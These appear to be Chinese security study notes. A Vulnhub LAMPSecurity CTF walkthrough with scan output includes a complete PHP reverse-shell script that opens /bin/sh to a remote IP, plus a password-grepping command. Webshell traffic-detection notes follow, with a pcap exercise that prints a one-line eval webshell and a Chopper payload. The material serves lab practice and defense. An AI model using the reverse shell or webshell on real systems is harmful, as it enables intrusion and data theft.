<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">FreeSpace: Disk C:\ 76398 MB</span><br><span class="line"></span><br><span class="line">Threads: 80</span><br><span class="line">Not Found PassWord File,Only Scan Mysql Port!</span><br><span class="line">load MysqlScan</span><br><span class="line">_ICMP: 192.168.222.132  00-0C-29-F7-4D-E0       VMware</span><br><span class="line">192.168.222.132 3306    Close</span><br><span class="line">IP Finished!</span><br><span class="line">End: 2023-04-12 20:22:43</span><br></pre></td></tr></table></figure>

<p>┌──(kali㉿kali)-[~&#x2F;Desktop]<br>└─$ mysql -h 192.168.222.143 -u root -p123456                                                      1 ⨯<br>ERROR 1045 (28000): Access denied for user ‘root‘@’192.168.222.132’ (using password: YES)</p>
<p>看80，25不知道干嘛的之后在管</p>
<p>80：</p>
<p>使用nikto+dirb</p>
<h2 id="┌──-kali㉿kali-x2F-Desktop-└─-nikto-url-http-192-168-222-143-Nikto-v2-1-6"><a href="#┌──-kali㉿kali-x2F-Desktop-└─-nikto-url-http-192-168-222-143-Nikto-v2-1-6" class="headerlink" title="┌──(kali㉿kali)-[~&#x2F;Desktop]└─$ nikto -url  http://192.168.222.143- Nikto v2.1.6"></a>┌──(kali㉿kali)-[~&#x2F;Desktop]<br>└─$ nikto -url  <a href="http://192.168.222.143/">http://192.168.222.143</a><br>- Nikto v2.1.6</h2><ul>
<li>Target IP:          192.168.222.143</li>
<li>Target Hostname:    192.168.222.143</li>
<li>Target Port:        80</li>
<li>Start Time:         2023-04-12 08:28:41 (GMT-4)</li>
</ul>
<hr>
<ul>
<li>Server: Apache&#x2F;2.2.6 (Fedora)</li>
<li>Retrieved x-powered-by header: PHP&#x2F;5.2.4</li>
<li>The anti-clickjacking X-Frame-Options header is not present.</li>
<li>The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS</li>
<li>The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type</li>
<li>Apache&#x2F;2.2.6 appears to be outdated (current is at least Apache&#x2F;2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.</li>
<li>Allowed HTTP Methods: <strong>GET, HEAD, POST, OPTIONS, TRACE</strong> </li>
<li>Web Server returns a valid response with junk HTTP methods, this may cause false positives.</li>
<li>OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST</li>
<li>&#x2F;index.php: PHP include error may indicate local or remote file inclusion is possible.</li>
<li>OSVDB-12184: &#x2F;?&#x3D;PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.</li>
<li>OSVDB-12184: &#x2F;?&#x3D;PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.</li>
<li>OSVDB-12184: &#x2F;?&#x3D;PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.</li>
<li>OSVDB-3092: <strong>&#x2F;phpmyadmin&#x2F;changelog.php</strong>: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts.</li>
<li>Server may leak inodes via ETags, header found with file &#x2F;phpmyadmin&#x2F;ChangeLog, inode: 558008, size: 22676, mtime: Mon Aug 20 22:59:12 2029</li>
<li>OSVDB-3092: &#x2F;phpmyadmin&#x2F;ChangeLog: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts.</li>
<li>Cookie SQMSESSID created without the httponly flag</li>
<li>OSVDB-3093: &#x2F;mail&#x2F;src&#x2F;read_body.php: SquirrelMail found</li>
<li>OSVDB-3093: &#x2F;squirrelmail&#x2F;src&#x2F;read_body.php: SquirrelMail found</li>
<li>&#x2F;info.php: Output from the phpinfo() function was found.</li>
<li>OSVDB-3233: &#x2F;info.php: PHP is installed, and a test script which runs phpinfo() was found. This gives a lot of system information.</li>
<li>OSVDB-3268: &#x2F;icons&#x2F;: Directory indexing found.</li>
<li>OSVDB-3233: &#x2F;icons&#x2F;README: Apache default file found.</li>
<li>OSVDB-5292: <strong>&#x2F;info.php</strong>?file&#x3D;<a href="http://cirt.net/rfiinc.txt">http://cirt.net/rfiinc.txt</a>?: RFI from RSnake’s list (<a href="http://ha.ckers.org/weird/rfi-locations.dat">http://ha.ckers.org/weird/rfi-locations.dat</a>) or from <a href="http://osvdb.org/">http://osvdb.org/</a> （<strong>phinfo界面，有敏感信息但没用</strong></li>
<li>&#x2F;phpmyadmin&#x2F;: phpMyAdmin directory found</li>
<li>OSVDB-3092: &#x2F;phpmyadmin&#x2F;Documentation.html: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts.</li>
<li>OSVDB-3092: &#x2F;phpmyadmin&#x2F;README: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts.</li>
<li>8724 requests: 0 error(s) and 26 item(s) reported on remote host</li>
<li>End Time:           2023-04-12 08:29:06 (GMT-4) (25 seconds)</li>
</ul>
<hr>
<ul>
<li>1 host(s) tested</li>
</ul>
<p>三个地方登录注册：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">登录</span><br><span class="line">http://192.168.222.143/phpmyadmin/ （sql试了g</span><br><span class="line">http://192.168.222.143/mail/src/login.php （很卡这个</span><br><span class="line">/events/?q=node&amp;destination=node  （sql试了g</span><br><span class="line"></span><br><span class="line">注册</span><br><span class="line">http://192.168.222.143/list/</span><br><span class="line">[21:45:58] [WARNING] information_schema not available, back-end DBMS is MySQL &lt; 5. database names will be fetched from &#x27;mysql&#x27; database</span><br><span class="line">[21:45:58] [INFO] retrieved: &#x27;test&#x27;</span><br><span class="line">[21:45:58] [INFO] retrieved: &#x27;test\\_%&#x27;</span><br><span class="line">有sql注入但没东西，寄</span><br></pre></td></tr></table></figure>

<p>感觉phpadmin是突破点，一个一个试：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DIRECTORY: http://192.168.222.143/phpmyadmin/contrib/                                             </span><br><span class="line">+ http://192.168.222.143/phpmyadmin/favicon.ico (CODE:200|SIZE:18902)                                 </span><br><span class="line">+ http://192.168.222.143/phpmyadmin/index.php (CODE:200|SIZE:8457)                                    </span><br><span class="line">==&gt; DIRECTORY: http://192.168.222.143/phpmyadmin/js/                                                  </span><br><span class="line">==&gt; DIRECTORY: http://192.168.222.143/phpmyadmin/lang/                                                </span><br><span class="line">+ http://192.168.222.143/phpmyadmin/libraries (CODE:403|SIZE:302)                                     </span><br><span class="line">+ http://192.168.222.143/phpmyadmin/LICENSE (CODE:200|SIZE:18011)                                     </span><br><span class="line">+ http://192.168.222.143/phpmyadmin/phpinfo.php (CODE:200|SIZE:0)                                     </span><br><span class="line">+ http://192.168.222.143/phpmyadmin/README (CODE:200|SIZE:2624)                                       </span><br><span class="line">+ http://192.168.222.143/phpmyadmin/robots.txt (CODE:200|SIZE:26)                                     </span><br><span class="line">==&gt; DIRECTORY: http://192.168.222.143/phpmyadmin/scripts/                                             </span><br><span class="line">==&gt; DIRECTORY: http://192.168.222.143/phpmyadmin/setup/                                               </span><br><span class="line">==&gt; DIRECTORY: http://192.168.222.143/phpmyadmin/themes/                                              </span><br><span class="line">+ http://192.168.222.143/phpmyadmin/TODO (CODE:200|SIZE:235)  </span><br></pre></td></tr></table></figure>

<p><a href="http://192.168.222.143/phpmyadmin/contrib/">http://192.168.222.143/phpmyadmin/contrib/</a> ，phpmyadmin也没东西</p>
<p>网页感觉没东西了：</p>
<p>PORT     STATE SERVICE     VERSION<br>22&#x2F;tcp   open  ssh         OpenSSH 4.7 (protocol 2.0)<br>25&#x2F;tcp   open  smtp        Sendmail 8.14.1&#x2F;8.14.1<br>80&#x2F;tcp   open  http        Apache httpd 2.2.6 ((Fedora))<br>110&#x2F;tcp  open  pop3        ipop3d 2006k.101<br>111&#x2F;tcp  open  rpcbind     2-4 (RPC #100000)<br>139&#x2F;tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: MYGROUP)<br>143&#x2F;tcp  open  imap        University of Washington IMAP imapd 2006k.396 (time zone: -0400)<br>445&#x2F;tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: MYGROUP)<br>901&#x2F;tcp  open  http        Samba SWAT administration server<br>3306&#x2F;tcp open  mysql       MySQL 5.0.45</p>
<p>一个一个搜漏洞</p>
<p>摆了。。</p>
<p>直接上awvs，洞还不少。。。任意文件读取（地权限）、xss、sql</p>
<p>试试cms漏洞：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">NanoCMS</span><br></pre></td></tr></table></figure>

<p>敏感信息泄露</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">set_time_limit (0);</span><br><span class="line">$ip = &quot;192.168.1.111&quot;;</span><br><span class="line">$port = &quot;13123&quot;;</span><br><span class="line"> </span><br><span class="line">$sock = fsockopen($ip, $port, $errno, $errstr, 30);</span><br><span class="line">if (!$sock) </span><br><span class="line">	exit(&quot;$errstr ($errno)&quot;);</span><br><span class="line"> </span><br><span class="line">if(function_exists(&#x27;proc_open&#x27;))&#123;</span><br><span class="line">$descriptorspec = array(</span><br><span class="line">   0 =&gt; array(&quot;pipe&quot;, &quot;r&quot;),  </span><br><span class="line">   1 =&gt; array(&quot;pipe&quot;, &quot;w&quot;),  </span><br><span class="line">   2 =&gt; array(&quot;pipe&quot;, &quot;w&quot;)  </span><br><span class="line">);</span><br><span class="line">$process = proc_open(&quot;id;/bin/sh -i&quot;, $descriptorspec, $pipes);</span><br><span class="line">if (!is_resource($process)) </span><br><span class="line">	exit(&quot;ERROR: Can&#x27;t reverse shell&quot;);</span><br><span class="line"> </span><br><span class="line">stream_set_blocking($pipes[0], 0);</span><br><span class="line">stream_set_blocking($pipes[1], 0);</span><br><span class="line">stream_set_blocking($pipes[2], 0);</span><br><span class="line">stream_set_blocking($sock, 0);</span><br><span class="line">	</span><br><span class="line">print(&quot;Successfully opened reverse shell to $ip:$port&quot;);</span><br><span class="line"> </span><br><span class="line">while (1) &#123;</span><br><span class="line">	if (feof($sock)) &#123;</span><br><span class="line">		print(&quot;ERROR: Shell connection terminated&quot;);</span><br><span class="line">		break;</span><br><span class="line">	&#125;</span><br><span class="line"> </span><br><span class="line">	if (feof($pipes[1])) &#123;</span><br><span class="line">		print(&quot;ERROR: Shell process terminated&quot;);</span><br><span class="line">		break;</span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	$input = fread($sock, 1024);</span><br><span class="line">	fwrite($pipes[0], $input);</span><br><span class="line">	</span><br><span class="line">	$output = fread($pipes[1], 1024);</span><br><span class="line">	fwrite($sock, $output);</span><br><span class="line">	</span><br><span class="line">	$output = fread($pipes[2], 1024);</span><br><span class="line">	fwrite($sock, $output);</span><br><span class="line">&#125;	</span><br><span class="line">fclose($sock);</span><br><span class="line">fclose($pipes[0]);</span><br><span class="line">fclose($pipes[1]);</span><br><span class="line">fclose($pipes[2]);</span><br><span class="line">proc_close($process);</span><br><span class="line">&#125;</span><br><span class="line">else print &quot;function &#x27;proc_open&#x27; is not exists.&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>grep -ir pass &#x2F;home&#x2F;* 2&gt;&#x2F;dev&#x2F;null </p>
<p>得到root密码，结束</p>
<h3 id="别人："><a href="#别人：" class="headerlink" title="别人："></a>别人：</h3><p><a href="https://www.freebuf.com/articles/network/211939.html">CTF靶场系列-LAMPSecurity: CTF5 - FreeBuf网络安全行业门户</a></p>
<p><a href="https://blog.csdn.net/kengkeng123qwe/article/details/124802020">Vulnhub-CTF5靶机实战_vulnhub windows靶机_御七彩虹猫的博客-CSDN博客</a></p>
<h2 id="CTF6"><a href="#CTF6" class="headerlink" title="CTF6"></a>CTF6</h2><p>还是比较简单（除了提权</p>
<p>注意的是：</p>
<p>最好在tmp下载利用脚本，改变权限，仔细看linux说明udev</p>
<h2 id="CTF7"><a href="#CTF7" class="headerlink" title="CTF7"></a>CTF7</h2><p>信息收集：</p>
<p>nmap、nessus、awvs、dirb、nikto</p>
<p>得到目标ip：192.168.222.254</p>
<p>漏洞探测：</p>
<p>漏洞利用：</p>
<p>提权：</p>
<p><img src="https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230417194051405.png" alt="image-20230417194051405"></p>
<p>找到一个用户能够直接sudo</p>
<h2 id="PWNOS-1-0（还没做）"><a href="#PWNOS-1-0（还没做）" class="headerlink" title="PWNOS 1.0（还没做）"></a>PWNOS 1.0（还没做）</h2><p>链接：<a href="https://www.vulnhub.com/entry/pwnos-10,33/">pWnOS: 1.0 ~ VulnHub</a></p>
<h2 id="PWNOS-2-0（还没做）"><a href="#PWNOS-2-0（还没做）" class="headerlink" title="PWNOS 2.0（还没做）"></a>PWNOS 2.0（还没做）</h2><h2 id="HOLYNIX"><a href="#HOLYNIX" class="headerlink" title="HOLYNIX"></a>HOLYNIX</h2>]]></content>
      <tags>
        <tag>vulhub靶机 渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>流量分析与应急响应</title>
    <url>/2023/04/24/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/</url>
    <content><![CDATA[<p>[toc]</p>
<p>参考：<a href="https://blog.csdn.net/q20010619/article/details/122096176">Shell管理工具流量分析-上（菜刀、蚁剑、冰蝎2.0流量分析）&amp;入侵检测、应急响应资料整理_冰蝎2.0流量特征_OceanSec的博客-CSDN博客</a></p>
<p><a href="https://blog.csdn.net/qq_32393893/article/details/117574848">CTF之流量分析_ctf 流量分析_shy014的博客-CSDN博客</a></p>
<p><a href="https://blog.csdn.net/q20010619/article/details/122096176">Shell管理工具流量分析-上（菜刀、蚁剑、冰蝎2.0流量分析）&amp;入侵检测、应急响应资料整理_冰蝎2.0流量特征_OceanSec的博客-CSDN博客</a></p>
<p><a href="https://blog.csdn.net/qq_53577336/article/details/125048353">Webshell工具的流量特征分析（菜刀，蚁剑，冰蝎，哥斯拉）_冰蝎流量特征_告白热的博客-CSDN博客</a></p>
<p><a href="https://blog.csdn.net/eternitymd/article/details/124492261">菜刀、冰蝎、蚁剑、哥斯拉的流量特征_蚁剑流量特征_呜呼起飞~的博客-CSDN博客</a></p>
<p><a href="https://blog.csdn.net/qq_42880719/article/details/122148345">ctfshow 摆烂杯 writeup_jiajia-cp-1_是Mumuzi的博客-CSDN博客</a></p>
<h2 id="常见指纹"><a href="#常见指纹" class="headerlink" title="常见指纹"></a>常见指纹</h2><p>过滤语句：http contains “sqlmap”</p>
<p>Awvs:<br>AWVS扫描器在请求的URL，Headers, Body三项里随机包含了能代表自己的特征信息</p>
<p>&lt;1&gt; Url: </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">acunetix-wvs-test-for-some-inexistent-file</span><br><span class="line">by_wvs</span><br><span class="line">acunetix_wvs_security_testacunetix</span><br><span class="line">acunetix_wvs</span><br><span class="line">acunetix_test</span><br></pre></td></tr></table></figure>

<p>&lt;2&gt; Headers:</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">Acunetix-Aspect-Password:</span><br><span class="line">Cookie: acunetixCookie</span><br><span class="line">Location: acunetix_wvs_security_testX-Forwarded-Host: acunetix_wvs_security_testX-Forwarded-For: acunetix_wvs_security_testHost: acunetix_wvs_security_testCookie: acunetix_wvs_security_testCookie: acunetix</span><br><span class="line">Accept: acunetix/wvs</span><br><span class="line">Origin: acunetix_wvs_security_testReferer: acunetix_wvs_security_testVia: acunetix_wvs_security_testAccept-Language: acunetix_wvs_security_testClient-IP: acunetix_wvs_security_testHTTP_AUTH_PASSWD: acunetix</span><br><span class="line">User-Agent: acunetix_wvs_security_testAcunetix-Aspect-Queries:任意值</span><br><span class="line">Acunetix-Aspect:任意值</span><br></pre></td></tr></table></figure>

<p>&lt;3&gt; Body </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">acunetix_wvs_security_testacunetix</span><br></pre></td></tr></table></figure>



<p>Appscan:</p>
<p>Appscan依然在请求的URL，Headers，Body三项里随机包含了能代表自己的特征信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;1&gt;Url</span><br><span class="line">Appscan</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;2&gt; Headers</span><br><span class="line">Content-Type: Appscan</span><br><span class="line">Content-Type: AppScanHeader</span><br><span class="line">Accept: Appscan</span><br><span class="line">User-Agent:Appscan</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;3&gt; Body</span><br><span class="line">Appscan</span><br></pre></td></tr></table></figure>



<p>Nessus:</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;1&gt; Url</span><br><span class="line">nessus</span><br><span class="line">Nessus</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;2&gt; Headers</span><br><span class="line">x_forwarded_for: nessus</span><br><span class="line">referer: nessus</span><br><span class="line">host: nessus</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;3&gt; Body</span><br><span class="line">nessus</span><br><span class="line">Nessus</span><br></pre></td></tr></table></figure>



<ul>
<li>x_forwarded_for:nessus</li>
<li>referer:nessus</li>
<li>host:nessus</li>
</ul>
<p>sqlmap:</p>
<ul>
<li>User-Agent:sqlmap1.2.8#stable</li>
</ul>
<p>Netsparker: </p>
<ul>
<li>X-Scanner:NetsparkerLocation:</li>
<li>NetsparkerAccept:netsparker&#x2F;chechCookie:</li>
<li>netsparkerCookie:NETSPARKER</li>
</ul>
<h2 id="webshell"><a href="#webshell" class="headerlink" title="webshell"></a>webshell</h2><h3 id="中国菜刀"><a href="#中国菜刀" class="headerlink" title="中国菜刀"></a>中国菜刀</h3><p>1.请求包中会有eval，assert, base64的特征字符（这里如果用eval方法就是eval ,如果是assert方法就是assert）<br>2.payload为base64加密，且为默认为&amp;z0&#x3D;QGluaV9zZXQ… 参数z0对应$_POST[z0]接收到的数据<br>且固定为QGluaV9zZXQ开头</p>
<h3 id="蚁剑"><a href="#蚁剑" class="headerlink" title="蚁剑"></a>蚁剑</h3><p>默认的蚁剑 shell，连接时会请求两次，其请求体只是经过 url 编码</p>
<p>第一次请求，关闭报错和 magic_quotes，接下来去获取主机的信息</p>
<p>第二次请求，会把主机目录列出来</p>
<h3 id="冰蝎"><a href="#冰蝎" class="headerlink" title="冰蝎"></a>冰蝎</h3><h4 id="2-0"><a href="#2-0" class="headerlink" title="2.0"></a>2.0</h4><p>使用 aes 加密发起三次请求</p>
<p>第一次请求服务端产生密钥写入 session，session 和当前会话绑定，不同的客户端的密钥也是不同的</p>
<p>第二次请求是为了获取 key，第三次使用 key 的 aes 加密进行通信</p>
<h4 id="3-0"><a href="#3-0" class="headerlink" title="3.0"></a>3.0</h4><p>使用 aes 加密发起两次请求</p>
<p>3.0 分析流量发现相比 2.0 少了动态密钥的获取的请求，不再使用随机生成 key，改为取连接密码的 md5 加密值的前 16 位作为密钥</p>
<p>一次请求为判断是否可以建立连接，少了俩次 get 获取冰蝎动态密钥的行为，第二次发送 phpinfo 等代码执行，获取网站的信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.请求数据包中的content-type字段常见为application/octet-stream；</span><br><span class="line"> 2.内置16个user-agent头</span><br><span class="line"> 3.content-lengt]请求长度，对于密钥交互，获取基本信息来讲，payload都为定长。</span><br></pre></td></tr></table></figure>

<h4 id="4-0"><a href="#4-0" class="headerlink" title="4.0"></a>4.0</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.Accep和Content-Type为弱特征且Content-type:一般为Application/x-www-form-urlencoded，这里可作为辅助特征</span><br><span class="line">2.内置10个user-agent ,每次连接shell时会随机选择一个进行使用.</span><br><span class="line">3.因为冰蝎4.0建立连接的同时，javaw也与目的主机建立tcp连接，每次连接使用本地端口在49700左右</span><br><span class="line">4.冰蝎通讯默认使用长连接，请求头和响应头里会带有 Connection且Connection为 Keep-Alive</span><br><span class="line">5.有固定的请求头和响应头，请求字节头：dFAXQV1LORcHRQtLRlwMAhwFTAg/M</span><br><span class="line">响应字节头：TxcWR1NNExZAD0ZaAWMIPAZjH1BFBFtHThcJSlUXWEd</span><br><span class="line">6.默认时，冰蝎 webshell都有“e45e329feb5d925b” 一串密钥。该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond</span><br></pre></td></tr></table></figure>



<h3 id="哥斯拉"><a href="#哥斯拉" class="headerlink" title="哥斯拉"></a>哥斯拉</h3><p>支持多种加密</p>
<p>采用了和冰蝎 3.0 一样的密钥交换方式，哥斯拉建立连接时会发起三次请求，第一次请求数据超级长，建立 session，第二三次请求确认连接</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.user-agent,如果不修改的话会返回使用的jdk信息</span><br><span class="line">2.在请求包的Cookie中有一个非常致命的特征是会在最后出现分号</span><br><span class="line">3.请求Accept和响应中Cache-Control字段（辅助认证）</span><br><span class="line">4.响应包中的数据前16位为MD5+base64+后16位为MD5。</span><br></pre></td></tr></table></figure>





<h2 id="做题："><a href="#做题：" class="headerlink" title="做题："></a>做题：</h2><p>链接：<a href="https://pan.baidu.com/s/14AyqVEydOREdifeeKvETjg?pwd=vray">https://pan.baidu.com/s/14AyqVEydOREdifeeKvETjg?pwd=vray</a> </p>
<p>答案链接：链接：<a href="https://pan.baidu.com/s/17O83AgZSjqV6yKkxGRXfUg?pwd=087q">https://pan.baidu.com/s/17O83AgZSjqV6yKkxGRXfUg?pwd=087q</a><br>提取码：087q </p>
<p>1、黑客使用的扫描器</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http contains &quot;wvs&quot;</span><br></pre></td></tr></table></figure>

<p>2、先黑客扫描到的后台登陆地址是：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http contains &quot;login&quot;	</span><br></pre></td></tr></table></figure>

<p>在：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http contains &quot;login.php?rec&quot; &amp;&amp; http.request.method==&quot;POST&quot;</span><br></pre></td></tr></table></figure>

<p>3、黑客使用了什么账号密码登陆了web后台</p>
<p>同二可得到答案</p>
<p>4、黑客上传的webshell文件名是，内容是什么</p>
<p>关键词：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">eval</span><br><span class="line">assert</span><br><span class="line">system</span><br></pre></td></tr></table></figure>

<p>语法</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http contains &quot;eval&quot; &amp;&amp; http.request.method==&quot;POST&quot;</span><br></pre></td></tr></table></figure>

<p>很快的定位到黑客上传的木马的地址：&#x2F;images&#x2F;article&#x2F;a.php</p>
<p>传的🐎密码为1234</p>
<p>再：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">tcp contains &quot;[1234]&quot;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">------WebKitFormBoundaryUIPbEBT1j473BLOO</span><br><span class="line">Content-Disposition: form-data; name=&quot;image&quot;; filename=&quot;1.php&quot;</span><br><span class="line">Content-Type: application/octet-stream</span><br><span class="line"></span><br><span class="line">&lt;?php @eval($_POST[1234]);?&gt;</span><br><span class="line">------WebKitFormBoundaryUIPbEBT1j473BLOO</span><br><span class="line">Content-Disposition: form-data; name=&quot;keywords&quot;</span><br><span class="line"></span><br><span class="line">............</span><br><span class="line">------WebKitFormBoundaryUIPbEBT1j473BLOO</span><br><span class="line">Content-Disposition: form-data; name=&quot;description&quot;</span><br></pre></td></tr></table></figure>

<p>结果：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1.php &lt;?php @eval($_POST[1234]);?&gt;</span><br></pre></td></tr></table></figure>

<p>5、黑客在robots.txt中找到的flag是什么：</p>
<p>直接搜robots.txt的关键词 Disallow 就好了</p>
<p>注意大小写</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http contains &quot;Disallow&quot;</span><br></pre></td></tr></table></figure>

<p>得到：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">flag:87b7cb79481f317bde90c116cf36084b</span><br></pre></td></tr></table></figure>

<p>6、黑客找到的数据库密码是多少：</p>
<p>分析菜刀流量</p>
<p>搜索：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http contains &quot;1234=&quot;</span><br></pre></td></tr></table></figure>

<p>然后追踪tcp流</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /images/article/a.php HTTP/1.1</span><br><span class="line">User-Agent: Java/1.8.0_171</span><br><span class="line">Host: 192.168.32.189</span><br><span class="line">Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Content-type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 375</span><br><span class="line"></span><br><span class="line">1234=@eval.(base64_decode($_POST[action]));&amp;action=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwiMCIpO0BzZXRfdGltZV9saW1pdCgwKTtAc2V0X21hZ2ljX3F1b3Rlc19ydW50aW1lKDApO2VjaG8oIi0%2BfCIpOzskRj1iYXNlNjRfZGVjb2RlKCRfUE9TVFsiejEiXSk7JFA9QGZvcGVuKCRGLCJyIik7ZWNobyhAZnJlYWQoJFAsZmlsZXNpemUoJEYpKSk7QGZjbG9zZSgkUCk7O2VjaG8oInw8LSIpO2RpZSgpOw%3D%3D&amp;z1=L3Zhci93d3cvaHRtbC9kYXRhL2NvbmZpZy5waHA%3DHTTP/1.1 200 OK</span><br><span class="line">Date: Wed, 08 Aug 2018 08:18:05 GMT</span><br><span class="line">Server: Apache/2.2.15 (CentOS)</span><br><span class="line">X-Powered-By: PHP/5.4.45</span><br><span class="line">Content-Length: 1092</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: text/html; charset=UTF-8</span><br><span class="line"></span><br><span class="line">-&gt;|&lt;?php</span><br><span class="line">/**</span><br><span class="line"> * DouPHP</span><br><span class="line"> * --------------------------------------------------------------------------------------------------</span><br><span class="line"> * ............ 2014-2015 ...............................................................</span><br><span class="line"> * ............: http://www.douco.com</span><br><span class="line"> * --------------------------------------------------------------------------------------------------</span><br><span class="line"> * ..............................................................................................................................................................................</span><br><span class="line"> * ...............http://www.douco.com/license.html</span><br><span class="line"> * --------------------------------------------------------------------------------------------------</span><br><span class="line"> * Author: DouCo</span><br><span class="line"> * Release Date: 2015-06-10</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line">// database host</span><br><span class="line">$dbhost   = &quot;10.3.3.101&quot;;</span><br><span class="line"></span><br><span class="line">// database name</span><br><span class="line">$dbname   = &quot;web&quot;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// database username</span><br><span class="line">$dbuser   = &quot;web&quot;;</span><br><span class="line"></span><br><span class="line">// database password</span><br><span class="line">$dbpass   = &quot;e667jUPvJjXHvEUv&quot;;</span><br><span class="line"></span><br><span class="line">// table prefix</span><br><span class="line">$prefix   = &quot;dou_&quot;;</span><br><span class="line"></span><br><span class="line">// charset</span><br><span class="line">define(&#x27;DOU_CHARSET&#x27;,&#x27;utf-8&#x27;);</span><br><span class="line"></span><br><span class="line">// administrator path</span><br><span class="line">define(&#x27;ADMIN_PATH&#x27;,&#x27;admin&#x27;);</span><br><span class="line"></span><br><span class="line">// mobile path</span><br><span class="line">define(&#x27;M_PATH&#x27;,&#x27;m&#x27;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?&gt;</span><br><span class="line">|&lt;-</span><br></pre></td></tr></table></figure>

<p>所以数据库密码为：e667jUPvJjXHvEUv</p>
<p>7、黑客在数据库中找到的hash_code是什么：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql.query matches &quot;hash_code&quot;</span><br></pre></td></tr></table></figure>

<p>d1c029893df40cb0f47bcf8f1c3c17ac</p>
<p>8、黑客破解了账号<a href="mailto:&#x69;&#x6a;&#x6e;&#117;&#x40;&#x74;&#x65;&#115;&#x74;&#x2e;&#x63;&#x6f;&#109;">&#x69;&#x6a;&#x6e;&#117;&#x40;&#x74;&#x65;&#115;&#x74;&#x2e;&#x63;&#x6f;&#109;</a>得到的密码是什么</p>
<p>mysql contains “<a href="mailto:&#x69;&#x6a;&#x6e;&#117;&#x40;&#116;&#x65;&#x73;&#x74;&#x2e;&#99;&#x6f;&#x6d;">&#x69;&#x6a;&#x6e;&#117;&#x40;&#116;&#x65;&#x73;&#x74;&#x2e;&#99;&#x6f;&#x6d;</a>“</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ijnu@test.com b78f5aa6e1606f07def6e839121a22ec.ADMIN</span><br></pre></td></tr></table></figure>

<p>md5解密</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">edc123!@#</span><br></pre></td></tr></table></figure>

<p>9、被黑客攻击的web服务器，网卡配置是：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http contains &quot;eth0&quot;</span><br></pre></td></tr></table></figure>

<p>答案：</p>
